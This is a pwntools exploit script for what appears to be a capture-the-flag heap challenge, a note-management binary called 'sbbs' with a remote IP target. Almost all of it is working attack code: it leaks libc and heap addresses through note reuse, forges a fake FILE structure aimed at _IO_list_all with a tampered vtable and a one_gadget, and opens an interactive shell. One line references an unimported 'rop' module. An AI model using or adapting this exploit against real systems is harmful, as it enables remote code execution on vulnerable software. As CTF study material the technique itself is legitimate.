from pwn import *
from ctypes import *
import os
#import roputils as rop

remote_addr = "116.62.142.216"
remote_port = 20002

local_addr = "127.0.0.1"
local_port = 1807

pc = "./sbbs"
pwn_elf = ELF(pc)
pwn_rop = rop.ROP(pc)
f_script = open('./script','rb')

uselibc = 2 #0 for no,1 for i386,2 for x64
local = 1
haslibc = 1
atta = 0

if uselibc == 2:
	context.arch = "amd64"
else:
	context.arch = "i386"

if uselibc ==2 and haslibc == 0:
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	if uselibc == 1 and haslibc == 0:
		libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
	else:
		libc = ELF('./libc.so.6')

if local == 1:
	if haslibc:
		p = process(pc,env={'LD_PRELOAD':'./libc.so.6'})
	else:
		p = process(pc)
elif local == 0:
	p = remote(remote_addr,remote_port)
	if haslibc:
		libc = ELF('./libc.so.6')
else:
	p = remote(local_addr,local_port)
	if haslibc:
		libc = ELF('./libc.so.6')

context.log_level = True

if local:
	if atta:
		gdb.attach(p,gdbscript=f_script)


def pack_file_64(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0,
              _mode = 0):
    struct = p64(_flags) + \
             p64(_IO_read_ptr) + \
             p64(_IO_read_end) + \
             p64(_IO_read_base) + \
             p64(_IO_write_base) + \
             p64(_IO_write_ptr) + \
             p64(_IO_write_end) + \
             p64(_IO_buf_base) + \
             p64(_IO_buf_end) + \
             p64(_IO_save_base) + \
             p64(_IO_backup_base) + \
             p64(_IO_save_end) + \
             p64(_IO_marker) + \
             p64(_IO_chain) + \
             p32(_fileno)
    struct = struct.ljust(0x88, "\x00")
    struct += p64(_lock)
    struct = struct.ljust(0xc0,"\x00")
    struct += p64(_mode)
    struct = struct.ljust(0xd8, "\x00")
    return struct


def sla(a,b):
	p.sendlineafter(a,b)

def sa(a,b):
	p.sendafter(a,b)

def ru(a):
	p.recvuntil(a)

def rv(a):
	return p.recv(a)

def lg(s,addr):
	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def create_note(size,content):
	sla('exit\n','1')
	sla('size\n',str(size))
	sla('note\n',content)

def delete_note(idx):
	sla('exit\n','2')
	sla('id:',str(idx))

def login(name):
	sla('exit\n','3')
	sa('name\n',name)
	sla('admin\n','1')

def hack():
	raw_input()
	create_note(0x98,'a')	#0
	create_note(0x98,'a')	#1
	create_note(0x98,'a')	#2
	for i in range(4):
		create_note(0x1600,'a')	#3~#7
	payload = (p64(0x20) + p64(0x6e68))*0x158
	create_note(0x1600,payload)
	create_note(0x98,'a')	#8
	
	delete_note(0)
	create_note(0x98,'a'*8)		#0
	ru('a'*8)
	top_addr = u64(rv(6).ljust(8,'\x00'))
	libc.address = top_addr - libc.symbols['__malloc_hook'] - 0x58 - 0x10
	lg('libc.address',libc.address)

	delete_note(0)
	delete_note(2)

	create_note(0x98,'a'*8)		#0
	ru('a'*8)
	heap_addr = u64(rv(3).ljust(8,'\x00'))
	lg('heap_addr',heap_addr)

	create_note(0x98,'a')		#2

	delete_note(0)

	payload = 'a'*8 + p64(heap_addr - 0x140 - 3)
	login(payload)

	create_note(0x90+0xa0*3,'a')	#0
	create_note(0x98,'a')		#9

	delete_note(0)
	delete_note(2)

	_IO_list_all = libc.symbols['_IO_list_all']
	vtable = libc.symbols['_IO_file_jumps'] + 0xc0
	one_gadget = libc.address + 0x3f52a
	lg('one_gadget',one_gadget)
	payload = '\x00'*(0x90+0xa0) + p64(0) + p64(0x61) + p64(0) + p64(_IO_list_all-0x10)
	payload += p64(0) + p64(1)
	payload += (0xd8 - 0x30)*'\x00'
	payload += p64(vtable) + p64(one_gadget)
	create_note(0x90+0xa0*3,payload)

	sla('exit\n','1')
	sla('size\n',str(0x98))
	
	p.interactive()
hack()